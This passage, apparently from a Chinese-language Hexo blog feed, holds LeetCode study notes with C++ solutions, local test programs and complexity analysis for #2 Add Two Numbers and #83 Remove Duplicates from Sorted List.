val2;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// head</span></span><br><span class="line">        <span class="keyword">if</span>(sum %<span class="number">10</span> != <span class="number">0</span>)&#123; </span><br><span class="line">        ListNode* newHead = <span class="keyword">new</span> <span class="built_in">ListNode</span>(sum % <span class="number">10</span>);</span><br><span class="line">        sum = sum /<span class="number">10</span>;</span><br><span class="line">        current = newHead;</span><br><span class="line">        previous  = newHead;</span><br><span class="line">        head = newHead;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 0 tail</span></span><br><span class="line">        ListNode* newHead = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        sum = sum /<span class="number">10</span>;</span><br><span class="line">        current = newHead;</span><br><span class="line">        previous  = newHead;</span><br><span class="line">        head = newHead;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// body</span></span><br><span class="line">        <span class="keyword">while</span> (sum  != <span class="number">0</span>)&#123;</span><br><span class="line">            ListNode* newNode = <span class="keyword">new</span> <span class="built_in">ListNode</span>(sum % <span class="number">10</span>);</span><br><span class="line">            current = newNode;</span><br><span class="line">            previous -&gt; next = newNode;</span><br><span class="line">            previous = newNode;</span><br><span class="line">            sum = sum /<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            head = <span class="keyword">new</span> <span class="built_in">ListNode</span>(sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><p>想法與剛剛一樣，但在sum 存成list的時候要下很多心思，要開始透過取餘數和除以10的方式來獲取每一個digit，再建立新節點，放入值。<strong>但最重要的問題是，這樣的作法容易發生Overflow</strong></p><p><img src="/img/LeetCode/2/runtime_error.png"></p><p>如果把變數改成 <code>long long</code>  或者 <code>unsigned long long</code> 在提交答案時還是會Overflow</p><p><img src="/img/LeetCode/2/runtime_error2.png"></p><p>因此這題的答案肯定不是要用我們轉成數字用加的</p><h2 id="其他做法"><a href="#其他做法" class="headerlink" title="其他做法"></a>其他做法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">addTwoNumbers</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> sum =<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> carry=<span class="number">0</span>;</span><br><span class="line">        ListNode *newHead = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        ListNode *current = newHead;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>( l1 != <span class="literal">nullptr</span> || l2 != <span class="literal">nullptr</span> )&#123;</span><br><span class="line">            sum = carry;</span><br><span class="line">            <span class="keyword">if</span> (l1 != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">                sum += l1-&gt;val;</span><br><span class="line">                l1 = l1 -&gt; next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (l2 != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">                sum += l2-&gt;val;</span><br><span class="line">                l2 = l2-&gt;next;</span><br><span class="line">            &#125; </span><br><span class="line">            carry = sum /<span class="number">10</span>;</span><br><span class="line">            current-&gt;next = <span class="keyword">new</span> <span class="built_in">ListNode</span>(sum % <span class="number">10</span>);</span><br><span class="line">            current = current -&gt; next;       </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(carry &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                current-&gt;next = <span class="keyword">new</span> <span class="built_in">ListNode</span>(carry);</span><br><span class="line">                current = current -&gt; next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> newHead-&gt;next;         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>後來的想法改變成：<strong>直接在list中進行相加，而不轉成數字</strong></p><p>需要額外處理的會是進位</p><h3 id="說明-1"><a href="#說明-1" class="headerlink" title="說明"></a>說明</h3><ul><li>首先宣告了一個新的head，但就是dummyHead</li><li>然後宣告 <code>current</code>指標，指向dummyHead</li><li>當 <code>l1</code> 或 <code>l2</code> 尚未走到最後節點時，會持續進行相加和計算進位</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l1 != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">    sum += l1-&gt;val;</span><br><span class="line">    l1 = l1 -&gt; next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (l2 != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">    sum += l2-&gt;val;</span><br><span class="line">    l2 = l2-&gt;next;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><ul><li>兩個 list 個別處理，將節點的值加進 <code>sum</code> 中，並將個別list 移到下一個節點</li><li>接著計算進位進位會是 <code>carry = sum /10</code></li><li>接著就是在 dummyHead 後面新增一個新節點，節點值會是 <code>sum % 10</code> 也就是取sum的個位數數字</li><li>更新 <code>current</code> 指標</li><li>最後判斷如果到最後 <code>carry &gt; 0</code> 新增一個進位用的節點，並更新指標，最後回傳dummyHead的下一個節點位址</li></ul><h3 id="完整本地測試程式碼"><a href="#完整本地測試程式碼" class="headerlink" title="完整本地測試程式碼"></a>完整本地測試程式碼</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ListNode</span> &#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    ListNode *next;</span><br><span class="line">    <span class="built_in">ListNode</span>() : <span class="built_in">val</span>(<span class="number">0</span>), <span class="built_in">next</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">    <span class="built_in">ListNode</span>(<span class="type">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">    <span class="built_in">ListNode</span>(<span class="type">int</span> x, ListNode *next) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(next) &#123;&#125;</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">struct</span> <span class="title class_">ListNode</span> *current;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintList</span><span class="params">(ListNode *first)</span></span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">ListNode</span> *ptr = first;</span><br><span class="line">    <span class="keyword">if</span>(first != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(ptr != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            cout &lt;&lt; ptr-&gt;val &lt;&lt; <span class="string">&quot;-&gt;&quot;</span>;</span><br><span class="line">            ptr = ptr -&gt; next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;empty list&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;NULL&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">ListNode* <span class="title">addTwoNumbers</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> sum =<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> carry=<span class="number">0</span>;</span><br><span class="line">    ListNode *newHead = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">    ListNode *current = newHead;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>( l1 != <span class="literal">nullptr</span> || l2 != <span class="literal">nullptr</span> )&#123;</span><br><span class="line">        sum = carry;</span><br><span class="line">        <span class="keyword">if</span> (l1 != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            sum += l1-&gt;val;</span><br><span class="line">            l1 = l1 -&gt; next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (l2 != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            sum += l2-&gt;val;</span><br><span class="line">            l2 = l2-&gt;next;</span><br><span class="line">        &#125; </span><br><span class="line">        carry = sum /<span class="number">10</span>;</span><br><span class="line">        current-&gt;next = <span class="keyword">new</span> <span class="built_in">ListNode</span>(sum % <span class="number">10</span>);</span><br><span class="line">        current = current -&gt; next;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(carry &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            current-&gt;next = <span class="keyword">new</span> <span class="built_in">ListNode</span>(carry);</span><br><span class="line">            current = current -&gt; next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> newHead-&gt;next;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//Create list 1</span></span><br><span class="line">    <span class="comment">// ListNode node1_3(9);</span></span><br><span class="line">    <span class="function">ListNode <span class="title">node1_2</span><span class="params">(<span class="number">9</span>)</span></span>;</span><br><span class="line">    <span class="function">ListNode <span class="title">node1_1</span><span class="params">(<span class="number">9</span>, &amp;node1_2)</span></span>;</span><br><span class="line">    <span class="comment">//Print List1</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;list1:&quot;</span>;</span><br><span class="line">    <span class="built_in">PrintList</span>(&amp;node1_1);</span><br><span class="line">    <span class="comment">//Create list 2</span></span><br><span class="line">    <span class="comment">//ListNode node2_2(9);</span></span><br><span class="line">    <span class="function">ListNode <span class="title">node2_1</span><span class="params">(<span class="number">9</span>)</span></span>;</span><br><span class="line">    <span class="comment">//Print List2</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;list2:&quot;</span>;</span><br><span class="line">    <span class="built_in">PrintList</span>(&amp;node2_1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Output</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Reverse output:&quot;</span>;</span><br><span class="line">    <span class="built_in">PrintList</span>(<span class="built_in">addTwoNumbers</span>(&amp;node1_1, &amp;node2_1));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/2/results.png"></p><h1 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>這個函數主要由一個 while 迴圈組成，迴圈會運行直到 <code>l1</code> 和 <code>l2</code> 都為 <code>nullptr</code>，在每次迭代中，我們至多只訪問 <code>l1</code> 和 <code>l2</code> 的每個節點一次。因此，時間複雜度取決於 <code>l1</code> 和 <code>l2</code> 的長度，假設 <code>l1</code> 和 <code>l2</code> 的長度分別為 $N$, $M$，則時間複雜度為 $O(max(N,M))$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>除了輸入的list外，我們創建了一個新的list來存儲結果。新list的長度將等於較長的輸入鏈表的長度加上可能的一個額外節點（存儲最後的進位）。<br>因此，空間複雜度也是 $O(max(n,m))$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Linked List </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>從排序鏈結串列刪除重複 | Easy | LeetCode#83. Remove Duplicates from Sorted List</title>
      <link href="/posts/c8064a2b.html"/>
      <url>/posts/c8064a2b.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/83/question1.png"><br><img src="/img/LeetCode/83/question2.png"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 給定一個排序鍊結串列的 <code>head</code>, 刪除所有重複節點，每個節點元素僅能出現一次，回傳排列串列</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><blockquote><p>這是第一次改用 C++ 寫 Linked List 題目，但由於題目是 single linked list，因此沒能夠用到透過 double linked list 實作的 <strong>std:list</strong> STL Library，有點小可惜，所以思路上還是用到了慣用的 C</p></blockquote><p>時間紀錄:</p><ul><li>想解決辦法: 1min</li><li>實際撰寫程式碼: 15 minutes</li></ul><blockquote><p>大概 Run 兩次，第一次沒有考慮到結尾 Null Pointer 的狀況</p></blockquote><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p><img src="/img/LeetCode/83/algo.png"></p><ol><li>定義好兩個指標，分別指到前一個節點跟當前節點</li><li>遍歷整個list</li><li>每次都檢查當前節點值與前一個節點值是否一樣，結束後更新指標值</li><li>回傳head</li></ol><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">deleteDuplicates</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        ListNode * ansHead = head;</span><br><span class="line">        ListNode * current = head;</span><br><span class="line">        ListNode *previous  =<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(current == head)&#123; <span class="comment">// head</span></span><br><span class="line">                previous = current;</span><br><span class="line">                current = current-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123; <span class="comment">// the following nodes</span></span><br><span class="line">                <span class="keyword">while</span> ( previous-&gt;val == current-&gt;val &amp;&amp; current-&gt;next != <span class="literal">NULL</span> )&#123;</span><br><span class="line">                    ListNode* temp = current-&gt;next; </span><br><span class="line">                    current = current-&gt;next;</span><br><span class="line">                    previous -&gt; next = current;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ( previous-&gt;val == current-&gt;val &amp;&amp; current-&gt;next == <span class="literal">NULL</span>)&#123;</span><br><span class="line">                    ListNode* temp = current-&gt;next; </span><br><span class="line">                    current = current-&gt;next;</span><br><span class="line">                    previous -&gt; next = current;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    current = current-&gt; next;</span><br><span class="line">                    previous = previous-&gt;next;</span><br><span class="line">                &#125; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ansHead;</span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><p>首先是初始化，<code>ansHead</code> 用來保存結果list的head，<code>current</code> 用來遍歷list，<code>previous</code> 用來記錄當前節點的前一個節點。接著當 <code>current!= NULL</code> 的時候，會去循環遍歷節點，這裡將頭節點以及其他節點分開處理，因為我希望如果有重複，刪除的都是第2個以後的節點，因此走到頭節點僅需要更新指標就好，走到其他節點時，就需要檢查前一個節點跟現在節點是否一樣 (<code>previous-&gt;val == current-&gt;val &amp;&amp; current-&gt;next != NULL</code>) 如果一樣，要做的事情有三件:</p><ol><li>建立臨時指標，用來指向 <code>current</code> 的下一個節點</li><li>將 <code>current</code> 指向其下一個節點</li><li>更新 <code>previous-&gt;next</code> 為 <code>current</code></li></ol><p><img src="/img/LeetCode/83/algo2.png"></p><p>如果有多個重複節點，就可以在 while 迴圈內一併刪除</p><p>如果走到最後一個節點，一樣建立臨時節點只到NULL，更新<code>current</code>成 NULL，並且更新 <code>previous</code> 指標。</p><p>最後回傳 <code>ansHead</code></p><h3 id="完整本地測試程式碼"><a href="#完整本地測試程式碼" class="headerlink" title="完整本地測試程式碼"></a>完整本地測試程式碼</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">ListNode</span> &#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    ListNode *next;</span><br><span class="line">    <span class="built_in">ListNode</span>() : <span class="built_in">val</span>(<span class="number">0</span>), <span class="built_in">next</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">    <span class="built_in">ListNode</span>(<span class="type">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">    <span class="built_in">ListNode</span>(<span class="type">int</span> x, ListNode *next) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(next) &#123;&#125;</span><br><span class="line">&#125; Node;</span><br><span class="line"></span><br><span class="line">Node *first, *current;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintList</span><span class="params">(Node *first)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">Node * <span class="title">deleteDuplicates</span><span class="params">(ListNode* head)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span> <span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// Define a 4-nodes linked list</span></span><br><span class="line">    <span class="function">ListNode <span class="title">node4</span><span class="params">(<span class="number">3</span>)</span></span>;</span><br><span class="line">    <span class="function">ListNode <span class="title">node3</span><span class="params">(<span class="number">3</span>, &amp;node4)</span></span>;</span><br><span class="line">    <span class="function">ListNode <span class="title">node2</span><span class="params">(<span class="number">2</span>, &amp;node3)</span></span>;</span><br><span class="line">    <span class="function">ListNode <span class="title">node1</span><span class="params">(<span class="number">1</span>, &amp;node2)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Print the list</span></span><br><span class="line">    <span class="built_in">PrintList</span>(&amp;node1);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">deleteDuplicates</span>(&amp;node1);</span><br><span class="line">    <span class="built_in">PrintList</span>(&amp;node1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintList</span><span class="params">(Node *first)</span></span>&#123;</span><br><span class="line">    Node * current = first;</span><br><span class="line">    <span class="keyword">if</span>(current!= <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span> ( current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            cout &lt;&lt; current-&gt;val &lt;&lt; <span class="string">&quot;-&gt;&quot;</span> ;</span><br><span class="line">            current = current-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Emppty List&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;NULL&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Node * <span class="title">deleteDuplicates</span><span class="params">(ListNode* head)</span></span>&#123;</span><br><span class="line">    Node * ansHead = head;</span><br><span class="line">    Node * current = head;</span><br><span class="line">    Node *previous  =<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(current == head)&#123; <span class="comment">// head</span></span><br><span class="line">            previous = current;</span><br><span class="line">            current = current-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123; <span class="comment">// the following nodes</span></span><br><span class="line">            <span class="keyword">while</span> ( previous-&gt;val == current-&gt;val &amp;&amp; current-&gt;next != <span class="literal">NULL</span> )&#123;</span><br><span class="line">                ListNode* temp = current-&gt;next;</span><br><span class="line">                current = current-&gt;next;</span><br><span class="line">                previous -&gt; next = current;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( previous-&gt;val == current-&gt;val &amp;&amp; current-&gt;next == <span class="literal">NULL</span>)&#123;</span><br><span class="line">                ListNode* temp = current-&gt;next;</span><br><span class="line">                current = current-&gt;next;</span><br><span class="line">                previous -&gt; next = current;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                current = current-&gt; next;</span><br><span class="line">                previous = previous-&gt;next;</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ansHead;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/83/results1.jpeg"></p><h2 id="其他作法"><a href="#其他作法" class="headerlink" title="其他作法"></a>其他作法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 